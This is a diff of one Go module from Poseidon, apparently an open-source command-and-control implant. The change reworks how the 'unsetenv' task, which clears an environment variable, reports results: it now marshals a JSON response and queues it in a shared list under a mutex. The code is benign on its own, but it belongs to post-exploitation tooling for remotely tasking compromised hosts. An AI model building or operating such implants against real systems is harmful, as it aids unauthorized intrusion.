@@ -1,29 +1,43 @@
 package unsetenv
 
 import (
+	"encoding/json"
 	"fmt"
 	"os"
 	"strings"
+	"sync"
 
+	"github.com/xorrior/poseidon/pkg/profiles"
 	"github.com/xorrior/poseidon/pkg/utils/structs"
 )
 
+var mu sync.Mutex
+
 //Run - interface method that retrieves a process list
-func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
-	tMsg := structs.ThreadMsg{}
-	tMsg.Error = false
-	tMsg.TaskItem = task
+func Run(task structs.Task) {
+	msg := structs.Response{}
+	msg.TaskID = task.TaskID
 
 	params := strings.TrimSpace(task.Params)
 	err := os.Unsetenv(params)
 
 	if err != nil {
-		tMsg.Error = true
-		tMsg.TaskResult = []byte(err.Error())
-		threadChannel <- tMsg
+		msg.UserOutput = err.Error()
+		msg.Completed = true
+		msg.Status = "error"
+
+		resp, _ := json.Marshal(msg)
+		mu.Lock()
+		profiles.TaskResponses = append(profiles.TaskResponses, resp)
+		mu.Unlock()
 		return
 	}
 
-	tMsg.TaskResult = []byte(fmt.Sprintf("Successfully cleared %s", params))
-	threadChannel <- tMsg
+	msg.Completed = true
+	msg.UserOutput = fmt.Sprintf("Successfully cleared %s", params)
+	resp, _ := json.Marshal(msg)
+	mu.Lock()
+	profiles.TaskResponses = append(profiles.TaskResponses, resp)
+	mu.Unlock()
+	return
 }
